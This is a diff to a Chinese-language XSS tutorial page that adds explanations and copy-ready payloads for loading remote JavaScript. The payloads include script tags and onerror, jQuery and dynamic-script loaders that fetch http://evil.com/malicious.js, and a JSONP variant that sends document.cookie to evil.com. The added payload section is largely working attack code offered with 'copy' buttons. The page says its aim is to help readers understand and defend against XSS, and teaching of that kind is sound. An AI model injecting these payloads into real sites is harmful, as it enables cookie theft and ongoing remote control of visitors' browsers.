@@ -485,6 +485,41 @@
             </div>
         </div>
 
+        <div class="flow-section" style="background: rgba(255, 215, 0, 0.1); border: 2px solid #ffd700;">
+            <h2 class="flow-title" style="color: #ffd700;">🌐 远程JS引入攻击流程</h2>
+            <div class="flow-steps">
+                <div class="flow-step" style="background: rgba(255, 215, 0, 0.2);">
+                    <div class="step-number" style="background: #ffd700; color: #1a1a2e;">1</div>
+                    <div class="step-title">注入外部脚本标签</div>
+                    <div class="step-desc">攻击者在评论区注入&lt;script src="恶意JS地址"&gt;</div>
+                </div>
+                <div class="arrow" style="color: #ffd700;">→</div>
+                <div class="flow-step" style="background: rgba(255, 215, 0, 0.2);">
+                    <div class="step-number" style="background: #ffd700; color: #1a1a2e;">2</div>
+                    <div class="step-title">页面加载外部JS</div>
+                    <div class="step-desc">用户访问页面，浏览器自动加载并执行远程脚本</div>
+                </div>
+                <div class="arrow" style="color: #ffd700;">→</div>
+                <div class="flow-step" style="background: rgba(255, 215, 0, 0.2);">
+                    <div class="step-number" style="background: #ffd700; color: #1a1a2e;">3</div>
+                    <div class="step-title">恶意代码执行</div>
+                    <div class="step-desc">远程JS可执行任意操作：窃取Cookie、记录键盘等</div>
+                </div>
+                <div class="arrow" style="color: #ffd700;">→</div>
+                <div class="flow-step" style="background: rgba(255, 215, 0, 0.2);">
+                    <div class="step-number" style="background: #ffd700; color: #1a1a2e;">4</div>
+                    <div class="step-title">数据外传</div>
+                    <div class="step-desc">窃取的数据发送到攻击者控制的服务器</div>
+                </div>
+                <div class="arrow" style="color: #ffd700;">→</div>
+                <div class="flow-step" style="background: rgba(255, 215, 0, 0.2);">
+                    <div class="step-number" style="background: #ffd700; color: #1a1a2e;">5</div>
+                    <div class="step-title">持续攻击</div>
+                    <div class="step-desc">攻击者可随时修改远程JS，无需重新注入</div>
+                </div>
+            </div>
+        </div>
+
         <div class="explain-section">
             <h2 class="explain-title"> XSS Payload 构成详解</h2>
             <p style="text-align: center; color: #aaa; margin-bottom: 30px;">了解XSS Payload的各个组成部分，帮助你更好地理解和防御XSS攻击</p>
@@ -612,6 +647,47 @@
                         <p class="explain-text">使用Image对象发送数据，绕过跨域限制，无感传输。</p>
                     </div>
                 </div>
+
+                <!-- 远程JS引入Payload解析 -->
+                <div class="explain-card">
+                    <div class="explain-card-title">🌐 远程JS引入 Payload 解析</div>
+                    
+                    <div class="component-box">
+                        <div class="component-title">1️⃣ 外部脚本引用</div>
+                        <div class="explain-code">&lt;script src="http://evil.com/malicious.js"&gt;&lt;/script&gt;</div>
+                        <p class="explain-text">通过src属性引用外部JavaScript文件，浏览器会自动下载并执行该脚本。</p>
+                    </div>
+                    
+                    <div class="component-box">
+                        <div class="component-title">2️⃣ 动态创建脚本</div>
+                        <div class="explain-code">var s=document.createElement('script'); s.src='...';</div>
+                        <p class="explain-text">使用JavaScript动态创建script标签，更隐蔽，可绕过部分过滤。</p>
+                    </div>
+                    
+                    <div class="component-box">
+                        <div class="component-title">3️⃣ JSONP方式</div>
+                        <div class="explain-code">&lt;script src="api?callback=handleData"&gt;&lt;/script&gt;</div>
+                        <p class="explain-text">利用JSONP跨域特性，通过回调函数接收并执行恶意代码。</p>
+                    </div>
+                    
+                    <div class="component-box">
+                        <div class="component-title">4️⃣ Data URI方式</div>
+                        <div class="explain-code">&lt;script src="data:text/javascript;base64,..."&gt;&lt;/script&gt;</div>
+                        <p class="explain-text">使用Data URI编码恶意脚本，无需外部服务器，代码直接嵌入。</p>
+                    </div>
+                    
+                    <div class="component-box">
+                        <div class="component-title">5️⃣ 协议处理程序</div>
+                        <div class="explain-code">&lt;script src="javascript:alert('XSS')"&gt;&lt;/script&gt;</div>
+                        <p class="explain-text">使用javascript:协议执行代码，部分浏览器支持此方式。</p>
+                    </div>
+                    
+                    <div class="component-box">
+                        <div class="component-title">6️⃣ 远程控制优势</div>
+                        <div class="explain-code">攻击者可随时修改远程JS文件内容</div>
+                        <p class="explain-text">无需重新注入XSS，只需修改远程JS文件，所有被攻击页面都会执行新代码。</p>
+                    </div>
+                </div>
             </div>
 
             <!-- 关键技术点 -->
@@ -657,6 +733,14 @@
                         <p class="explain-text">• 获取敏感信息：信用卡号、身份证号等</p>
                         <p class="explain-text">• 监控行为：了解用户操作习惯</p>
                         <p class="explain-text">• 持续攻击：脚本持续运行直到页面关闭</p>
+                    </div>
+                    
+                    <div class="explain-card">
+                        <div class="explain-card-title">🌐 远程JS引入的危害</div>
+                        <p class="explain-text">• 远程控制：攻击者可随时修改恶意代码</p>
+                        <p class="explain-text">• 无需重注：修改远程JS即可更新攻击逻辑</p>
+                        <p class="explain-text">• 隐蔽性强：恶意代码不在页面源码中</p>
+                        <p class="explain-text">• 功能丰富：可加载完整的攻击工具库</p>
                     </div>
                 </div>
             </div>
@@ -719,7 +803,20 @@ img.<span style="color: #79c0ff;">src</span> = url;
         keys = <span style="color: #a5d6ff;">''</span>;
     }
 });
-<span style="color: #ff7b72;">&lt;/script&gt;</span></pre>
+<span style="color: #ff7b72;">&lt;/script&gt;</span>
+
+<span style="color: #8b949e;">// 远程JS引入完整Payload</span>
+<span style="color: #ff7b72;">&lt;script src="http://evil.com/malicious.js"&gt;&lt;/script&gt;</span>
+
+<span style="color: #8b949e;">// 动态创建script标签</span>
+<span style="color: #ff7b72;">&lt;script&gt;</span>
+<span style="color: #ff7b72;">var</span> script = <span style="color: #79c0ff;">document</span>.<span style="color: #d2a8ff;">createElement</span>(<span style="color: #a5d6ff;">'script'</span>);
+script.<span style="color: #79c0ff;">src</span> = <span style="color: #a5d6ff;">'http://evil.com/malicious.js'</span>;
+<span style="color: #79c0ff;">document</span>.<span style="color: #79c0ff;">body</span>.<span style="color: #d2a8ff;">appendChild</span>(script);
+<span style="color: #ff7b72;">&lt;/script&gt;</span>
+
+<span style="color: #8b949e;">// Data URI方式</span>
+<span style="color: #ff7b72;">&lt;script src="data:text/javascript;base64,YWxlcnQoJ1hTUycp"&gt;&lt;/script&gt;</span></pre>
                 </div>
             </div>
         </div>
@@ -839,6 +936,64 @@ document.addEventListener('keydown',function(e){
 });
 "&gt;</div>
             <button class="copy-btn" onclick="copyPayload('payload9')">复制代码</button>
+
+            <h3 style="margin: 40px 0 10px; color: #ffd700;">🌐 远程JS引入 Payload</h3>
+            <p style="color: #aaa; margin-bottom: 15px;">以下Payload可以加载外部恶意JavaScript文件，实现远程控制：</p>
+            
+            <h4 style="margin: 20px 0 10px; color: #fff;">方式1：直接引入外部JS（最简单）</h4>
+            <div class="code-block" id="payload10">&lt;script src="http://evil.com/malicious.js"&gt;&lt;/script&gt;</div>
+            <button class="copy-btn" onclick="copyPayload('payload10')">复制代码</button>
+
+            <h4 style="margin: 20px 0 10px; color: #fff;">方式2：动态创建script标签</h4>
+            <div class="code-block" id="payload11">&lt;script&gt;
+(function() {
+    var script = document.createElement('script');
+    script.src = 'http://evil.com/malicious.js';
+    script.onload = function() {
+        console.log('恶意脚本已加载');
+    };
+    document.body.appendChild(script);
+})();
+&lt;/script&gt;</div>
+            <button class="copy-btn" onclick="copyPayload('payload11')">复制代码</button>
+
+            <h4 style="margin: 20px 0 10px; color: #fff;">方式3：JSONP方式加载</h4>
+            <div class="code-block" id="payload12">&lt;script&gt;
+(function() {
+    var script = document.createElement('script');
+    script.src = 'http://evil.com/api?callback=handleData&data=' + encodeURIComponent(document.cookie);
+    document.body.appendChild(script);
+    
+    // 定义回调函数接收数据
+    window.handleData = function(response) {
+        // 恶意代码已执行
+        console.log('数据已发送');
+    };
+})();
+&lt;/script&gt;</div>
+            <button class="copy-btn" onclick="copyPayload('payload12')">复制代码</button>
+
+            <h4 style="margin: 20px 0 10px; color: #fff;">方式4：Data URI方式（无需外部服务器）</h4>
+            <div class="code-block" id="payload13">&lt;script src="data:text/javascript;base64,YWxlcnQoJ1hTUyB0aHJvdWdoIERhdGEgVVJJIScp"&gt;&lt;/script&gt;
+<span style="color: #8b949e;">// Base64解码后内容：alert('XSS through Data URI!')</span></div>
+            <button class="copy-btn" onclick="copyPayload('payload13')">复制代码</button>
+
+            <h4 style="margin: 20px 0 10px; color: #fff;">方式5：隐藏在图片错误事件中</h4>
+            <div class="code-block" id="payload14">&lt;img src="x" onerror="
+var s=document.createElement('script');
+s.src='http://evil.com/malicious.js';
+document.body.appendChild(s);
+"&gt;</div>
+            <button class="copy-btn" onclick="copyPayload('payload14')">复制代码</button>
+
+            <h4 style="margin: 20px 0 10px; color: #fff;">方式6：使用jQuery加载（如果页面有jQuery）</h4>
+            <div class="code-block" id="payload15">&lt;script&gt;
+$.getScript('http://evil.com/malicious.js', function() {
+    // 恶意脚本已加载并执行
+    console.log('Script loaded');
+});
+&lt;/script&gt;</div>
+            <button class="copy-btn" onclick="copyPayload('payload15')">复制代码</button>
         </div>
 
         <div style="text-align: center; color: #aaa; padding: 20px;">
